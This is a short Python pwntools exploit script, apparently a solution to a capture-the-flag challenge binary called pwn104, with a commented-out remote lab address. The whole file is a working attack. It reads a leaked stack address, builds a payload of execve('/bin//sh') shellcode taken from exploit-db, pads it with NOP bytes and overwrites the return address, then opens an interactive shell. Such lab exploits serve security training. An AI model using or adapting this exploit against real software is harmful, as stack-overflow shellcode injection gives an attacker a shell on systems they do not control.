from pwn import *

context.binary = ELF('./pwn104.pwn104',checksec=False)

# p = remote('10.10.18.166',9004)
p = process()
p.recvuntil(b'at ')
address = p.recvline()

# https://www.exploit-db.com/shellcodes/46907
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# will also work with asm(shellcraft.sh())

payload = shellcode
payload += b'\x90' * (88 - len(shellcode))
payload += p64(int(address, 16))

p.sendline(payload)
p.interactive()

